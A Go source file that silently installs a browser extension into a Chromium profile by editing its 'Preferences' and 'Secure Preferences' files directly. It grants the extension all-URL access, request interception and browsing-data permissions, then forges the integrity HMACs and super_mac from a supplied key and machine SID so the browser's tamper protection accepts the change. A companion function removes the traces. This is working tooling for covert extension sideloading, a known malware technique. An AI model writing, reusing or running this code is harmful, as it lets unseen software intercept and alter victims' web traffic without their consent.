package browser

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/yinxulai/go-template/internal/types"
	"github.com/yinxulai/go-template/internal/utils"
)

// UpdateProfile updates browser profile preferences to add an extension
func UpdateProfile(profile, extensionID, extensionPath string, key []byte, sid string) error {
	prefsPath := filepath.Join(profile, "Preferences")
	securePrefsPath := filepath.Join(profile, "Secure Preferences")

	// Read Preferences
	prefs := &types.Preferences{}
	if data, err := os.ReadFile(prefsPath); err == nil {
		json.Unmarshal(data, prefs)
	}

	// Initialize structures
	if prefs.Extensions == nil {
		prefs.Extensions = &types.ExtensionsPrefs{}
	}
	if prefs.Extensions.InstallSignature == nil {
		prefs.Extensions.InstallSignature = &types.InstallSignature{IDs: []string{}}
	}
	if prefs.Extensions.Toolbar == nil {
		prefs.Extensions.Toolbar = []string{}
	}

	// Add extension ID if not exists
	if !utils.Contains(prefs.Extensions.InstallSignature.IDs, extensionID) {
		prefs.Extensions.InstallSignature.IDs = append(prefs.Extensions.InstallSignature.IDs, extensionID)
	}
	if !utils.Contains(prefs.Extensions.Toolbar, extensionID) {
		prefs.Extensions.Toolbar = append(prefs.Extensions.Toolbar, extensionID)
	}

	// Read Secure Preferences
	securePrefs := &types.SecurePreferences{}
	if data, err := os.ReadFile(securePrefsPath); err == nil {
		json.Unmarshal(data, securePrefs)
	}

	// Initialize structures
	if securePrefs.Extensions == nil {
		securePrefs.Extensions = &types.SecureExtensions{}
	}
	if securePrefs.Extensions.Settings == nil {
		securePrefs.Extensions.Settings = make(map[string]interface{})
	}

	// Create extension data
	escapedPath := strings.ReplaceAll(extensionPath, "\\", "\\\\")
	extensionData := fmt.Sprintf(`{"active_permissions":{"api":["browsingData","contentSettings","tabs","webRequest","webRequestBlocking"],"explicit_host":["*://*/*","\u003Call_urls>","chrome://favicon/*","http://*/*","https://*/*"],"scriptable_host":["\u003Call_urls>"]},"creation_flags":38,"from_bookmark":false,"from_webstore":false,"granted_permissions":{"api":["browsingData","contentSettings","tabs","webRequest","webRequestBlocking"],"explicit_host":["*://*/*","\u003Call_urls>","chrome://favicon/*","http://*/*","https://*/*"],"scriptable_host":["\u003Call_urls>"]},"install_time":"13188169127141243","location":4,"never_activated_since_loaded":true,"newAllowFileAccess":true,"path":"%s","state":1,"was_installed_by_default":false,"was_installed_by_oem":false}`, escapedPath)

	var extDataMap map[string]interface{}
	json.Unmarshal([]byte(extensionData), &extDataMap)
	securePrefs.Extensions.Settings[extensionID] = extDataMap

	// Calculate HMAC
	message := fmt.Sprintf("%sextensions.settings.%s%s", sid, extensionID, extensionData)
	hash := strings.ToUpper(utils.GetHMACSHA256(key, message))

	// Initialize protection structures
	if securePrefs.Protection == nil {
		securePrefs.Protection = &types.Protection{}
	}
	if securePrefs.Protection.Macs == nil {
		securePrefs.Protection.Macs = &types.Macs{}
	}
	if securePrefs.Protection.Macs.Extensions == nil {
		securePrefs.Protection.Macs.Extensions = &types.MacsExtensions{}
	}
	if securePrefs.Protection.Macs.Extensions.Settings == nil {
		securePrefs.Protection.Macs.Extensions.Settings = make(map[string]string)
	}

	securePrefs.Protection.Macs.Extensions.Settings[extensionID] = hash

	// Calculate super_mac
	macsJSON, _ := json.Marshal(securePrefs.Protection.Macs)
	superMacMessage := fmt.Sprintf("%s%s", sid, string(macsJSON))
	securePrefs.Protection.SuperMac = strings.ToUpper(utils.GetHMACSHA256(key, superMacMessage))

	// Write files
	prefsData, _ := json.MarshalIndent(prefs, "", "  ")
	if err := os.WriteFile(prefsPath, prefsData, 0644); err != nil {
		return err
	}

	securePrefsData, _ := json.MarshalIndent(securePrefs, "", "  ")
	if err := os.WriteFile(securePrefsPath, securePrefsData, 0644); err != nil {
		return err
	}

	return nil
}

// RemoveFromProfile removes extension from browser profile preferences
func RemoveFromProfile(profile, extensionID string, key []byte, sid string) error {
	prefsPath := filepath.Join(profile, "Preferences")
	securePrefsPath := filepath.Join(profile, "Secure Preferences")

	// Read Preferences
	prefs := &types.Preferences{}
	if data, err := os.ReadFile(prefsPath); err == nil {
		json.Unmarshal(data, prefs)
	}

	// Remove from Preferences
	if prefs.Extensions != nil {
		if prefs.Extensions.InstallSignature != nil {
			prefs.Extensions.InstallSignature.IDs = utils.RemoveString(prefs.Extensions.InstallSignature.IDs, extensionID)
		}
		if prefs.Extensions.Toolbar != nil {
			prefs.Extensions.Toolbar = utils.RemoveString(prefs.Extensions.Toolbar, extensionID)
		}
	}

	// Read Secure Preferences
	securePrefs := &types.SecurePreferences{}
	if data, err := os.ReadFile(securePrefsPath); err == nil {
		json.Unmarshal(data, securePrefs)
	}

	// Remove from Secure Preferences
	if securePrefs.Extensions != nil && securePrefs.Extensions.Settings != nil {
		delete(securePrefs.Extensions.Settings, extensionID)
	}

	if securePrefs.Protection != nil && securePrefs.Protection.Macs != nil &&
		securePrefs.Protection.Macs.Extensions != nil && securePrefs.Protection.Macs.Extensions.Settings != nil {
		delete(securePrefs.Protection.Macs.Extensions.Settings, extensionID)
	}

	// Recalculate super_mac
	if securePrefs.Protection != nil && securePrefs.Protection.Macs != nil {
		macsJSON, _ := json.Marshal(securePrefs.Protection.Macs)
		superMacMessage := fmt.Sprintf("%s%s", sid, string(macsJSON))
		securePrefs.Protection.SuperMac = strings.ToUpper(utils.GetHMACSHA256(key, superMacMessage))
	}

	// Write files
	prefsData, _ := json.MarshalIndent(prefs, "", "  ")
	if err := os.WriteFile(prefsPath, prefsData, 0644); err != nil {
		return err
	}

	securePrefsData, _ := json.MarshalIndent(securePrefs, "", "  ")
	if err := os.WriteFile(securePrefsPath, securePrefsData, 0644); err != nil {
		return err
	}

	return nil
}
